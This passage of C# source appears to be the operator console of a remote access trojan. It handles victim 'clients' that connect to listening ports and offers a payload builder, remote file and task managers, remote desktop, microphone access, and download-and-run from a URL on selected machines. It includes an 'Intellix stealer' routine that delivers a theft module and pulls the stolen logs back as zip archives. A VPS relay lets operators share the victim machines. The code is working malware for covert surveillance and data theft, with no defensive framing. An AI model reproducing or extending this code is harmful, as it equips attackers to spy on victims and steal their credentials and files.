            if (_portManagerPanel != null && !_portManagerPanel.IsDisposed) return;
            _portManagerPanel = new PortManagerPanel(_servers, AddListeningPort, RemoveListeningPort);
            _portManagerPanel.TopLevel        = false;
            _portManagerPanel.FormBorderStyle = FormBorderStyle.None;
            _portManagerPanel.Dock            = DockStyle.Fill;
            _portManagerPanel.Visible         = false;
            panelRight.Controls.Add(_portManagerPanel);
            _portManagerPanel.Show();
            ThemeManager.ApplyForm(_portManagerPanel);
        }

        private void EnsureKeywordsPanelCreated()
        {
            if (_keywordsPanel != null && !_keywordsPanel.IsDisposed) return;
            _keywordsPanel = new KeywordsPanel(_clientHandlers);
            _keywordsPanel.TopLevel        = false;
            _keywordsPanel.FormBorderStyle = FormBorderStyle.None;
            _keywordsPanel.Dock            = DockStyle.Fill;
            _keywordsPanel.Visible         = false;
            panelRight.Controls.Add(_keywordsPanel);
            _keywordsPanel.Show();
            ThemeManager.ApplyForm(_keywordsPanel);

            _keywordsPanel.StartMonitoringAll();
        }

        // ── Port management (called from PortManagerPanel) ────────────────────

        internal string? AddListeningPort(int port)
        {
            if (_servers.Any(s => s.Port == port))
                return $"Port {port} is already active.";

            var server = new TcpServer(port);
            server.ClientConnected    += OnClientConnected;
            server.ClientDisconnected += OnClientDisconnected;
            server.ClientHandshake    += OnClientHandshake;
            server.Error              += OnServerError;

            try
            {
                server.Start();
                _servers.Add(server);
                UpdateClientCount();
                return null;
            }
            catch (Exception ex)
            {
                server.Stop();
                return ex.Message;
            }
        }

        internal void RemoveListeningPort(TcpServer server)
        {
            server.Stop();
            _servers.Remove(server);
            UpdateClientCount();
        }

        private void EnsureStealerLogsPanelCreated()
        {
            if (_stealerLogsPanel != null && !_stealerLogsPanel.IsDisposed) return;
            _stealerLogsPanel = new StealerLogsPanel();
            _stealerLogsPanel.TopLevel        = false;
            _stealerLogsPanel.FormBorderStyle = FormBorderStyle.None;
            _stealerLogsPanel.Dock            = DockStyle.Fill;
            _stealerLogsPanel.Visible         = false;
            panelRight.Controls.Add(_stealerLogsPanel);
            _stealerLogsPanel.Show();
            ThemeManager.ApplyForm(_stealerLogsPanel);
        }

        private void EnsurePlaceholder(ref Panel? panel, string text)
        {
            if (panel != null && !panel.IsDisposed) return;
            panel = new Panel { Dock = DockStyle.Fill, Visible = false };
            var lbl = new Label { Text = text, Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter, Font = new Font("Segoe UI", 12F) };
            panel.Controls.Add(lbl);
            panelRight.Controls.Add(panel);
        }

        // ── Builder dropdown handlers ─────────────────────────────────────────

        private void menuBuilderOpenOutput_Click(object? sender, EventArgs e)
        {
            var folder = Forms.BuilderForm._lastOutputPath is not null
                ? System.IO.Path.GetDirectoryName(Forms.BuilderForm._lastOutputPath)
                : null;
            if (folder == null || !System.IO.Directory.Exists(folder))
            {
                MessageBox.Show("No output folder yet. Build first.", "Open Output Folder",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
            {
                FileName        = folder,
                UseShellExecute = true,
            });
        }

        private void OpenBuilder()
        {
            using var frm = new Forms.BuilderForm();
            ThemeManager.ApplyForm(frm);
            frm.ShowDialog(this);
        }

        private void menuChangelog_Click(object? sender, EventArgs e)
        {
            using var frm = new Forms.ChangelogForm();
            ThemeManager.ApplyForm(frm);
            frm.ShowDialog(this);
        }

        private void menuAbout_Click(object? sender, EventArgs e)
        {
            using var frm = new Forms.AboutForm();
            ThemeManager.ApplyForm(frm);
            frm.ShowDialog(this);
        }

        private void menuFileManager_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null)
            {
                MessageBox.Show("Select a connected client first.", "File Manager",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var bytes = ModuleLoader.GetModuleBytes("mullvad.Module.FileManager");
            if (bytes is null)
            {
                MessageBox.Show(
                    "The File Manager module was not found.\n\n" +
                    "Build the FileManager project so it copies to:\n" +
                    $"{ModuleLoader.ModulesDir}\\mullvad.Module.FileManager.enc",
                    "Module Not Found", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            var frm = new FileManagerForm(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuReconnect_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            _ = handler.ReconnectAsync();
        }

        private void menuUninstall_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            if (MessageBox.Show(
                    $"Uninstall the client on '{handler.Info.Computer}'?\nThe client will delete itself and exit permanently.",
                    "Uninstall", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) return;
            ToastNotification.Show("Client Uninstalled", $"{handler.Info.Computer} has been uninstalled.");
            _ = handler.UninstallAsync();
        }

        private void menuOpenClientFolder_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var folderName = string.IsNullOrWhiteSpace(handler.Info.Computer)
                ? handler.Info.Id
                : string.Join("_", handler.Info.Computer.Split(Path.GetInvalidFileNameChars()));
            var dir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "clients", folderName);
            try
            {
                Directory.CreateDirectory(dir);
                System.Diagnostics.Process.Start("explorer.exe", dir);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Could not open folder:\n{ex.Message}", "Error",
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void menuDisconnect_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            _ = handler.TerminateAsync();
            handler.Disconnect();
        }

        private void menuUpdate_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var url = InputDialog.Show("Enter the URL of the update executable:", "Update Client", "");
            if (string.IsNullOrWhiteSpace(url)) return;
            _ = handler.UpdateAsync(url.Trim());
        }

        private void menuConnDetails_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            using var frm = new ClientDetailsForm(handler.Info);
            ThemeManager.ApplyForm(frm);
            frm.ShowDialog(this);
        }

        private void menuSelectAll_Click(object sender, EventArgs e)
            => listViewConnections.Items.Cast<ListViewItem>().ToList().ForEach(i => i.Selected = true);

        private ClientHandler? GetSelectedConnectionHandler()
        {
            if (listViewConnections.SelectedItems.Count == 0)
            {
                using var dlg = new Form
                {
                    Text            = "No one selected lol",
                    ClientSize      = new Size(260, 100),
                    FormBorderStyle = FormBorderStyle.FixedDialog,
                    MaximizeBox     = false,
                    MinimizeBox     = false,
                    StartPosition   = FormStartPosition.CenterParent,
                };
                var lbl = new Label { Text = "xD lol.", Left = 20, Top = 20, AutoSize = true };
                var btn = new Button { Text = "Ok", Left = 90, Top = 55, Width = 80, Height = 28, FlatStyle = FlatStyle.Flat };
                btn.Click += (_, _) => dlg.Close();
                dlg.Controls.Add(lbl);
                dlg.Controls.Add(btn);
                dlg.AcceptButton = btn;
                ThemeManager.ApplyForm(dlg);
                dlg.ShowDialog(this);
                return null;
            }
            var id = listViewConnections.SelectedItems[0].Tag as string;
            return id is not null && _clientHandlers.TryGetValue(id, out var h) ? h : null;
        }

        // ── Toolbar ──────────────────────────────────────────────────────────

        private void menuToolsSettings_Click(object sender, EventArgs e)
        {
            using var frm = new SettingsForm();
            frm.ShowDialog(this);
        }

        private void ApplyTheme()
        {
            if (IsDisposed) return;
            if (InvokeRequired) { BeginInvoke(ApplyTheme); return; }

            ThemeManager.ApplyForm(this);

            // DatabaseViewerForm is embedded (TopLevel=false) — not in Application.OpenForms
            if (_dbViewer != null && !_dbViewer.IsDisposed)
                ThemeManager.ApplyForm(_dbViewer);
        }

        private void tsBuilder_Click(object sender, EventArgs e) => OpenBuilder();

        private void toolStrip1_Layout(object sender, LayoutEventArgs e) { }

        private void SyncSearchWidth()
        {
            int w = splitContainerMain.SplitterDistance - tsSearch.Margin.Horizontal - 2;
            if (w > 0) tsSearch.Width = w;
        }

        private void tsSearch_TextChanged(object sender, EventArgs e)
            => ApplySearchFilter();

        private void ApplySearchFilter()
        {
            string q = tsSearch.Text?.Trim() ?? "";
            listViewConnections.BeginUpdate();
            try
            {
                int shown = 0;
                foreach (var item in _connectionItems.Values)
                {
                    var id = item.Tag as string;
                    var info = id is not null && _clientHandlers.TryGetValue(id, out var h) ? h.Info : null;

                    bool match = q.Length == 0 ||
                        (info != null && (
                            info.DisplayIp.Contains(q, StringComparison.OrdinalIgnoreCase)  ||
                            info.Computer.Contains(q, StringComparison.OrdinalIgnoreCase)   ||
                            info.Username.Contains(q, StringComparison.OrdinalIgnoreCase)   ||
                            info.Country.Contains(q, StringComparison.OrdinalIgnoreCase)    ||
                            info.Group.Contains(q, StringComparison.OrdinalIgnoreCase)));

                    bool visibleNow = item.ListView == listViewConnections;
                    if (match && !visibleNow) { listViewConnections.Items.Add(item); shown++; }
                    else if (match && visibleNow) shown++;
                    else if (!match && visibleNow) item.Remove();
                }
                if (q.Length > 0)
                    SetStatus($"Search '{q}': {shown}/{_connectionItems.Count} client(s) shown.");
            }
            finally { listViewConnections.EndUpdate(); }
        }

        // Reconnect slot repurposed as a File Explorer shortcut.
        private void btnReconnect_Click(object sender, EventArgs e) => menuFileManager_Click(sender, e);

        // Terminate slot repurposed as a Task Manager shortcut.
        private void btnTerminate_Click(object sender, EventArgs e) => menuMgmtTaskMgr_Click(sender, e);

        // Uninstall slot repurposed as a Remote Desktop (JPEG) shortcut.
        private void btnUninstall_Click(object sender, EventArgs e) => menuRdpNormal_Click(sender, e);

        // System Information shortcut.
        private void btnSysInfo_Click(object sender, EventArgs e) => menuSysInfo_Click(sender, e);

        // Disconnect shortcut — cuts the selected client without a confirm dialog.
        private void btnDisconnect_Click(object sender, EventArgs e) => menuDisconnect_Click(sender, e);

        private void listViewConnections_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listViewConnections.SelectedItems.Count > 0)
                statusLabel.Text = $"Selected: {listViewConnections.SelectedItems[0].SubItems[1].Text}";
            else
                UpdateClientCount();

            LoadDetailsForSelection();
        }

        private void treeViewFiles_NodeMouseDoubleClick(object sender, TreeNodeMouseClickEventArgs e) { }

        // ── Auto rules ───────────────────────────────────────────────────────

        private void menuAutoAccept_Click(object sender, EventArgs e)
        {
            _autoAccept = menuAutoAccept.Checked;
            if (_autoAccept)
            {
                _autoDecline = false;
                menuAutoDecline.Checked = false;

                // Accept all clients already waiting in the side list
                var pending = listViewSide.Items.Cast<ListViewItem>()
                    .Select(i => i.Tag as string)
                    .Where(id => id is not null)
                    .ToList();
                foreach (var id in pending)
                    if (_clientHandlers.TryGetValue(id!, out var h))
                        AcceptHandler(h);
            }
        }

        private void menuAutoDecline_Click(object sender, EventArgs e)
        {
            _autoDecline = menuAutoDecline.Checked;
            if (_autoDecline) { _autoAccept = false; menuAutoAccept.Checked = false; }
        }

        // ── Save to Database ─────────────────────────────────────────────────

        private void menuSaveAll_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            SetStatus($"Saving {handler.Info.Computer} to database…");
            _ = SaveAllToDatabaseAsync(handler);
        }

        private async Task SaveAllToDatabaseAsync(ClientHandler handler)
        {
            var clientId = handler.Info.Id;
            int saved = 0;

            // Always upsert client record so the clients table stays in sync
            ServerDatabase.UpsertClient(handler.Info);

            // SystemInformation → (item, value)
            var sysJson = await TryCollectAsync(handler, "mullvad.Module.SystemInformation", "mullvad.sysinfo");
            if (sysJson is not null)
            {
                var rows = ParseRows(sysJson)
                    .Select(r => ($"{r.a} / {r.b}", r.c))
                    .ToList();
                ServerDatabase.SaveSystemInfo(clientId, rows);
                saved++;
            }

            // AdvancedSystemInformation → (category, item, value)
            var advJson = await TryCollectAsync(handler, "mullvad.Module.AdvancedSystemInformation", "mullvad.advsysinfo");
            if (advJson is not null)
            {
                var rows = ParseRows(advJson)
                    .Select(r => (r.a, r.b, r.c))
                    .ToList();
                ServerDatabase.SaveAdvancedInfo(clientId, rows);
                saved++;
            }

            // NetworkInformation → (adapter, item, value)
            var netJson = await TryCollectAsync(handler, "mullvad.Module.NetworkInformation", "mullvad.netinfo");
            if (netJson is not null)
            {
                var rows = ParseRows(netJson)
                    .Select(r => (r.a, r.b, r.c))
                    .ToList();
                ServerDatabase.SaveNetworkInfo(clientId, rows);
                saved++;
            }

            if (!IsDisposed)
                BeginInvoke(() => SetStatus(
                    saved == 3
                        ? $"Saved all 3 modules to database for {handler.Info.Computer}  —  {DateTime.Now:HH:mm:ss}"
                        : $"Saved {saved}/3 modules for {handler.Info.Computer} (some timed out)  —  {DateTime.Now:HH:mm:ss}"));
        }

        // Separate CTSs for delivery and collect so a slow delivery doesn't starve the collect timeout.
        private static async Task<string?> TryCollectAsync(ClientHandler handler, string moduleFile, string moduleId)
        {
            try
            {
                var bytes = ModuleLoader.GetModuleBytes(moduleFile);
                if (bytes is null) return null;

                using var deliveryCts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
                bool ok = await ModuleDelivery.EnsureDeliveredAsync(handler, moduleFile, bytes, null, deliveryCts.Token);
                if (!ok) return null;

                using var collectCts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
                using var ctx = new ModuleContext(handler, moduleId);
                return await ctx.ExecuteAsync("collect", "", collectCts.Token);
            }
            catch { return null; }
        }

        // Parses [{a/category/adapter, b/item, c/value}] — handles both 2-key and 3-key objects.
        // Returns (first, second, third?) where third defaults to second if key is missing.
        private static List<(string a, string b, string c)> ParseRows(string json)
        {
            var result = new List<(string, string, string)>();
            try
            {
                using var doc = JsonDocument.Parse(json);
                foreach (var el in doc.RootElement.EnumerateArray())
                {
                    string a = "", b = "", c = "";
                    foreach (var prop in el.EnumerateObject())
                    {
                        var v = prop.Value.GetString() ?? "";
                        switch (prop.Name)
                        {
                            case "category": case "adapter": a = v; break;
                            case "item":  b = v; break;
                            case "value": c = v; break;
                        }
                    }
                    result.Add((a, b, c));
                }
            }
            catch { }
            return result;
        }

        // ── Run Full Recovery (Intellix stealer) ─────────────────────────────

        private void menuRunFullRecovery_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            SetStatus($"Running Intellix recovery on {handler.Info.Computer}…");
            _ = RunFullRecoveryAsync(handler);
        }

        private async Task RunFullRecoveryAsync(ClientHandler handler)
        {
            const string moduleFile = "mullvad.Module.Intellix";
            const string moduleId   = "mullvad.intellix";

            try
            {
                var bytes = ModuleLoader.GetModuleBytes(moduleFile);
                if (bytes is null)
                {
                    SetStatus("Intellix module not found in the Modules folder — build the Intellix project.");
                    return;
                }

                SetStatus($"Delivering Intellix module to {handler.Info.Computer}…");
                using (var deliveryCts = new CancellationTokenSource(TimeSpan.FromSeconds(60)))
                {
                    bool delivered = await ModuleDelivery.EnsureDeliveredAsync(
                        handler, moduleFile, bytes, null, deliveryCts.Token);
                    if (!delivered)
                    {
                        SetStatus($"Intellix delivery failed for {handler.Info.Computer}.");
                        return;
                    }
                }

                SetStatus($"Intellix collecting on {handler.Info.Computer} — this can take a few minutes…");
                string infoJson;
                using (var ctx = new ModuleContext(handler, moduleId))
                using (var collectCts = new CancellationTokenSource(TimeSpan.FromMinutes(6)))
                {
                    // 3-minute hard cap inside the module + up to 6 minutes of chunk transfer.
                    infoJson = await ctx.ExecuteAsync("collect", "", collectCts.Token, TimeSpan.FromMinutes(9));
                }

                int totalChunks;
                int entryCount = 0;
                try
                {
                    using var doc = JsonDocument.Parse(infoJson);
                    var root = doc.RootElement;
                    if (!root.TryGetProperty("total_chunks", out var tc) || root.GetProperty("success").GetBoolean() != true)
                        throw new Exception(root.TryGetProperty("error", out var err) ? err.GetString() ?? "collect failed" : "collect failed");
                    totalChunks = tc.GetInt32();
                    if (root.TryGetProperty("entries", out var ec)) entryCount = ec.GetInt32();
                }
                catch (Exception ex)
                {
                    SetStatus("Intellix collect failed: " + ex.Message);
                    return;
                }

                // Pull the ZIP in 1 MB chunks so each response stays under the 4 MB packet cap.
                using var zipMs = new MemoryStream();
                using (var chunkCtx = new ModuleContext(handler, moduleId))
                using (var chunkCts = new CancellationTokenSource(TimeSpan.FromMinutes(6)))
                {
                    for (int i = 0; i < totalChunks; i++)
                    {
                        SetStatus($"Intellix — receiving log {i + 1}/{totalChunks} chunks from {handler.Info.Computer}…");
                        string chunkJson = await chunkCtx.ExecuteAsync("chunk", i.ToString(), chunkCts.Token, TimeSpan.FromMinutes(2));
                        using var cdoc   = JsonDocument.Parse(chunkJson);
                        string b64       = cdoc.RootElement.GetProperty("data").GetString() ?? "";
                        byte[] chunk     = Convert.FromBase64String(b64);
                        await zipMs.WriteAsync(chunk, 0, chunk.Length);
                    }
                }

                byte[] zipBytes = zipMs.ToArray();
                string filePath = SaveRecoveryZip(handler, zipBytes);

                if (!IsDisposed)
                    BeginInvoke(() =>
                    {
                        EnsureStealerLogsPanelCreated();
                        tsStealer_Click(null!, EventArgs.Empty);
                        _stealerLogsPanel!.AddLog(handler.Info.Computer, zipBytes, filePath);
                    });

                SetStatus($"Intellix recovery complete from {handler.Info.Computer} — {entryCount} entries, {zipBytes.Length / 1024} KB  —  {DateTime.Now:HH:mm:ss}");
            }
            catch (Exception ex)
            {
                if (!IsDisposed) SetStatus("Intellix error: " + ex.Message);
            }
        }

        private static string SaveRecoveryZip(ClientHandler handler, byte[] zipBytes)
        {
            try
            {
                string dir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "mullvad", "Intellix");
                Directory.CreateDirectory(dir);
                string pc   = string.Join("_", handler.Info.Computer.Split(Path.GetInvalidFileNameChars()));
                string file = Path.Combine(dir, $"{DateTime.Now:yyyy-MM-dd_HH-mm-ss}_{pc}.zip");
                File.WriteAllBytes(file, zipBytes);
                return file;
            }
            catch { return ""; }
        }

        // ── Remote Management: execute on clients ────────────────────────────

        private List<ClientHandler> GetSelectedConnectionHandlers()
        {
            var result = new List<ClientHandler>();
            foreach (ListViewItem item in listViewConnections.SelectedItems)
            {
                if (item.Tag as string is string id && _clientHandlers.TryGetValue(id, out var h))
                    result.Add(h);
            }
            return result;
        }

        private void menuRemoteExecDisk_Click(object sender, EventArgs e)
        {
            var handlers = GetSelectedConnectionHandlers();
            if (handlers.Count == 0) { GetSelectedConnectionHandler(); return; }

            var frm = new RemoteExecDiskForm(handlers);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuRemoteExecUrl_Click(object sender, EventArgs e)
        {
            var handlers = GetSelectedConnectionHandlers();
            if (handlers.Count == 0) { GetSelectedConnectionHandler(); return; }

            string url = InputDialog.Show("URL of the file to download and run:", "Remote Execute — From URL") ?? "";
            if (string.IsNullOrWhiteSpace(url)) return;

            string args = InputDialog.Show("Arguments to run it with (optional):", "Arguments") ?? "";
            _ = RemoteExecute.ExecuteUrlOnClients(this, handlers, url, args,
                m => { if (!IsDisposed) BeginInvoke(() => SetStatus(m)); });
        }

        // ── Surveillance: Remote Microphone Send ─────────────────────────────

        private void menuRemoteMicSend_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;

            var frm = new MicrophoneSendForm(handler);
            frm.Show(this);
        }

        // ── VPS menu ─────────────────────────────────────────────────────────

        private void menuVpsHost_Click(object sender, EventArgs e)
        {
            if (_vpsHost is not null)
            {
                MessageBox.Show("Host is already running.", "Host", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var portStr = InputDialog.Show("Operator port:", "Host");
            if (string.IsNullOrWhiteSpace(portStr)) return;
            if (!int.TryParse(portStr.Trim(), out int port) || port < 1 || port > 65535)
            {
                MessageBox.Show("Invalid port.", "Host", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            var password = InputDialog.Show("Operator password:", "Host");
            if (string.IsNullOrWhiteSpace(password)) return;

            _vpsHost = new VpsHostServer(port, password);
            _vpsHost.StatusChanged += s => this.BeginInvoke(() => SetStatus(s));
            _vpsHost.Error         += ex => this.BeginInvoke(() => SetStatus($"Host error: {ex.Message}"));

            _vpsHost.Start();

            // Register all currently connected real clients
            foreach (var h in _clientHandlers.Values)
                _vpsHost.RegisterClient(h);

            UpdateVpsMenuState();
        }

        private void menuVpsConnect_Click(object sender, EventArgs e)
        {
            if (_vpsOp is not null)
            {
                MessageBox.Show("Already connected to a Host.", "Host", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var host = InputDialog.Show("Host IP/address:", "Host Connect");
            if (string.IsNullOrWhiteSpace(host)) return;

            var portStr = InputDialog.Show("Operator port:", "Host Connect");
            if (string.IsNullOrWhiteSpace(portStr)) return;
            if (!int.TryParse(portStr.Trim(), out int port) || port < 1 || port > 65535)
            {
                MessageBox.Show("Invalid port.", "Host", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            var password = InputDialog.Show("Password:", "Host Connect");
            if (string.IsNullOrWhiteSpace(password)) return;

            _vpsOp = new VpsOperatorClient();
            _vpsOp.ClientConnected    += OnClientConnected;
            _vpsOp.ClientDisconnected += OnClientDisconnected;
            _vpsOp.ClientHandshake    += OnClientHandshake;
            _vpsOp.Error              += ex => this.BeginInvoke(() =>
            {
                SetStatus($"Host error: {ex.Message}");
                _vpsOp = null;
                UpdateVpsMenuState();
            });

            UpdateVpsMenuState();

            _ = Task.Run(async () =>
            {
                try
                {
                    await _vpsOp.ConnectAsync(host.Trim(), port, password);
                    this.BeginInvoke(() => SetStatus($"Connected to Host at {host.Trim()}:{port}"));
                }
                catch (Exception ex)
                {
                    _vpsOp = null;
                    this.BeginInvoke(() =>
                    {
                        UpdateVpsMenuState();
                        MessageBox.Show($"Failed to connect: {ex.Message}", "Host Connect",
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                    });
                }
            });
        }

        private void menuVpsStop_Click(object sender, EventArgs e)
        {
            if (_vpsHost is not null)
            {
                _vpsHost.Stop();
                _vpsHost = null;
            }
            if (_vpsOp is not null)
            {
                _vpsOp.Disconnect();
                _vpsOp = null;
            }
            UpdateVpsMenuState();
            UpdateClientCount();
        }

        private void UpdateVpsMenuState()
        {
            bool active = _vpsHost is not null || _vpsOp is not null;
            menuVpsHost.Enabled    = _vpsHost is null && _vpsOp is null;
            menuVpsConnect.Enabled = _vpsHost is null && _vpsOp is null;
            menuVpsStop.Enabled    = active;
        }

        private static string CountryName(string code)
        {
            return _countryNames.TryGetValue(code.ToLower(), out var name) ? name : code.ToUpper();
        }

        private static readonly Dictionary<string, string> _countryNames = new(StringComparer.OrdinalIgnoreCase)
        {
            ["af"] = "Afghanistan",          ["al"] = "Albania",              ["dz"] = "Algeria",
            ["ad"] = "Andorra",              ["ao"] = "Angola",               ["ag"] = "Antigua and Barbuda",
            ["ar"] = "Argentina",            ["am"] = "Armenia",              ["au"] = "Australia",
            ["at"] = "Austria",              ["az"] = "Azerbaijan",           ["bs"] = "Bahamas",
            ["bh"] = "Bahrain",              ["bd"] = "Bangladesh",           ["bb"] = "Barbados",
            ["by"] = "Belarus",              ["be"] = "Belgium",              ["bz"] = "Belize",
            ["bj"] = "Benin",                ["bt"] = "Bhutan",               ["bo"] = "Bolivia",
            ["ba"] = "Bosnia and Herzegovina",["bw"] = "Botswana",            ["br"] = "Brazil",
            ["bn"] = "Brunei",               ["bg"] = "Bulgaria",             ["bf"] = "Burkina Faso",
            ["bi"] = "Burundi",              ["cv"] = "Cape Verde",           ["kh"] = "Cambodia",
            ["cm"] = "Cameroon",             ["ca"] = "Canada",               ["cf"] = "Central African Republic",
            ["td"] = "Chad",                 ["cl"] = "Chile",                ["cn"] = "China",
            ["co"] = "Colombia",             ["km"] = "Comoros",              ["cg"] = "Congo",
            ["cd"] = "Congo (DRC)",          ["cr"] = "Costa Rica",           ["hr"] = "Croatia",
            ["cu"] = "Cuba",                 ["cy"] = "Cyprus",               ["cz"] = "Czech Republic",
            ["dk"] = "Denmark",              ["dj"] = "Djibouti",             ["do"] = "Dominican Republic",
            ["ec"] = "Ecuador",              ["eg"] = "Egypt",                ["sv"] = "El Salvador",
            ["gq"] = "Equatorial Guinea",    ["er"] = "Eritrea",              ["ee"] = "Estonia",
            ["sz"] = "Eswatini",             ["et"] = "Ethiopia",             ["fj"] = "Fiji",
            ["fi"] = "Finland",              ["fr"] = "France",               ["ga"] = "Gabon",
            ["gm"] = "Gambia",               ["ge"] = "Georgia",              ["de"] = "Germany",
            ["gh"] = "Ghana",                ["gr"] = "Greece",               ["gd"] = "Grenada",
            ["gt"] = "Guatemala",            ["gn"] = "Guinea",               ["gw"] = "Guinea-Bissau",
            ["gy"] = "Guyana",               ["ht"] = "Haiti",                ["hn"] = "Honduras",
            ["hu"] = "Hungary",              ["is"] = "Iceland",              ["in"] = "India",
            ["id"] = "Indonesia",            ["ir"] = "Iran",                 ["iq"] = "Iraq",
            ["ie"] = "Ireland",              ["il"] = "Israel",               ["it"] = "Italy",
            ["jm"] = "Jamaica",              ["jp"] = "Japan",                ["jo"] = "Jordan",
            ["kz"] = "Kazakhstan",           ["ke"] = "Kenya",                ["ki"] = "Kiribati",
            ["kp"] = "North Korea",          ["kr"] = "South Korea",          ["kw"] = "Kuwait",
            ["kg"] = "Kyrgyzstan",           ["la"] = "Laos",                 ["lv"] = "Latvia",
            ["lb"] = "Lebanon",              ["ls"] = "Lesotho",              ["lr"] = "Liberia",
            ["ly"] = "Libya",                ["li"] = "Liechtenstein",        ["lt"] = "Lithuania",
            ["lu"] = "Luxembourg",           ["mg"] = "Madagascar",           ["mw"] = "Malawi",
            ["my"] = "Malaysia",             ["mv"] = "Maldives",             ["ml"] = "Mali",
            ["mt"] = "Malta",                ["mh"] = "Marshall Islands",     ["mr"] = "Mauritania",
            ["mu"] = "Mauritius",            ["mx"] = "Mexico",               ["fm"] = "Micronesia",
            ["md"] = "Moldova",              ["mc"] = "Monaco",               ["mn"] = "Mongolia",
            ["me"] = "Montenegro",           ["ma"] = "Morocco",              ["mz"] = "Mozambique",
            ["mm"] = "Myanmar",              ["na"] = "Namibia",              ["nr"] = "Nauru",
            ["np"] = "Nepal",                ["nl"] = "Netherlands",          ["nz"] = "New Zealand",
            ["ni"] = "Nicaragua",            ["ne"] = "Niger",                ["ng"] = "Nigeria",
            ["mk"] = "North Macedonia",      ["no"] = "Norway",               ["om"] = "Oman",
            ["pk"] = "Pakistan",             ["pw"] = "Palau",                ["pa"] = "Panama",
            ["pg"] = "Papua New Guinea",     ["py"] = "Paraguay",             ["pe"] = "Peru",
            ["ph"] = "Philippines",          ["pl"] = "Poland",               ["pt"] = "Portugal",
            ["qa"] = "Qatar",                ["ro"] = "Romania",              ["ru"] = "Russia",
            ["rw"] = "Rwanda",               ["kn"] = "Saint Kitts and Nevis",["lc"] = "Saint Lucia",
            ["vc"] = "Saint Vincent",        ["ws"] = "Samoa",                ["sm"] = "San Marino",
            ["st"] = "Sao Tome and Principe",["sa"] = "Saudi Arabia",         ["sn"] = "Senegal",
            ["rs"] = "Serbia",               ["sc"] = "Seychelles",           ["sl"] = "Sierra Leone",
            ["sg"] = "Singapore",            ["sk"] = "Slovakia",             ["si"] = "Slovenia",
            ["sb"] = "Solomon Islands",      ["so"] = "Somalia",              ["za"] = "South Africa",
            ["ss"] = "South Sudan",          ["es"] = "Spain",                ["lk"] = "Sri Lanka",
            ["sd"] = "Sudan",                ["sr"] = "Suriname",             ["se"] = "Sweden",
            ["ch"] = "Switzerland",          ["sy"] = "Syria",                ["tw"] = "Taiwan",
            ["tj"] = "Tajikistan",           ["tz"] = "Tanzania",             ["th"] = "Thailand",
            ["tl"] = "Timor-Leste",          ["tg"] = "Togo",                 ["to"] = "Tonga",
            ["tt"] = "Trinidad and Tobago",  ["tn"] = "Tunisia",              ["tr"] = "Turkey",
            ["tm"] = "Turkmenistan",         ["tv"] = "Tuvalu",               ["ug"] = "Uganda",
            ["ua"] = "Ukraine",              ["ae"] = "United Arab Emirates", ["gb"] = "United Kingdom",
            ["us"] = "United States",        ["uy"] = "Uruguay",              ["uz"] = "Uzbekistan",
            ["vu"] = "Vanuatu",              ["ve"] = "Venezuela",            ["vn"] = "Vietnam",
            ["ye"] = "Yemen",                ["zm"] = "Zambia",               ["zw"] = "Zimbabwe",
        };
    }
}
